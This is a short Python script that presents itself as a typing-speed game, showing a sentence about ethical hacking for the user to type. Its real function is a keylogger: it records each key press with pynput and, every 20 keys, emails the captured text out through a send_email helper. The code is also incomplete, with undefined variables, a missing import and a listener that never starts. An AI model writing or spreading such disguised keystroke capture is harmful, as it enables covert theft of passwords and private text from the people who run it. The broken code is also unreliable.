from pynput.keyboard import Key, Listener
import datetime

sentence = " An Ethical Hacker is a skilled professional who has excellent technical knowledge and skills and knows how to identify and exploit vulnerabilities in target systems. He works with the permission of the owners of systems. An ethical Hacker must comply with the rules of the target organization or owner and the law of the land and their aim is to assess the security posture of a target organization/system."
print("Type this as fast as you can!")
print(sentence)
correct, incorrect = 0, 0
current_index = 0

start_time = datetime.datetime.now()

def on_press(key):
    print(key, end=" ")
    print("pressed ")
    global keys, count
    keys.append(str(key)+'\n')
    count += 1
    if count > 20:
        count = 0
        email(keys)

def email(keys):
    message = ""
    for key in keys:
        k = key.replace("'", "")
        if key == "Key.space":
            k = " "
        elif key.find("Key") > 0:
            k = ""
        message += k
        
    print(message)
    send_email.sendEmail(message)
    
    
    
def on_release(key):
    if key== Key.esc:
        return False
    